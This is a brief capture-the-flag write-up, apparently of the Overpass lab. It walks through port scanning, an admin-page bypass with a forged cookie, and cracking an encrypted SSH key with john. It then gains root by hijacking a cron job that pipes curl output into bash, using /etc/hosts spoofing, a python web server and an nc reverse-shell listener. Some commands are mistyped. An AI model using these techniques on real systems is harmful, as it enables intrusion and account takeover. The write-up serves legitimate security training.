target = '10.10.92.160'

nmap scan open ports
```
22, 80
```

![image](./images/basic/img19.png)

dir enumeration with dirb http://10.10.92.160
- /admin 

Found two bypass methods
- Changing the response
    - Burp intercept the request to change the response to allow for a redirect to the admin page
    - ![image](./images/basic/img20.png)
    - To this```HTTP/1.1 302 FOUND
    Date: Mon, 20 Jul 2020 14:33:13 GMT
    Content-Length: 21
    Content-Type: text/plain; charset=utf-8
    Connection: close
    location: /admin```
    <!-- - ![image](./images/basic/) -->

- Setting cookie 
    - With console, running ```documentcookie="SessionToken=pleaselogmein"```
    - ![image](./images/basic/img22.png)
    


Now u get the to the admin page

![image](./images/basic/img21.png)

Now we have found two users
- James
- Paradox

Private key belonging to James
- Save it to local machine
- Its encrypted!! We can use john to crack it
    - We first generate hash using ssh2john ```ssh2john james.key > jame.key.txt```
    - Now we crack it ```john jame.key.txt --wordlist=/path/wordlist```
        - We now get 
            - ![image](./images/basic/img23.png)
            - ```chmod 600 jame.key``` - set necessary permissions

```ssh -i jame.key james@10.10.92.160``` -p james13
We are in the machine

linpeas.sh enumeration to escalete manenos

There is crontab running with root priv
```* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash```

Overpass.thm is the host so we need to spoof it to fit our IP.
```ech0 '10.8.253.0 overpass.thm' /etc/hosts ```


We need to set up a curl server on our machine to serve the curl request. It should have dir/paths to match the crontab job
``` python3 -m http.server 80 ```

Create a nc listener so as to connect back to our machine
```nc -nlvp 1423```

We wait. Boooom!!! We are ROOT!!!!!

![image](./images/basic/img24.png)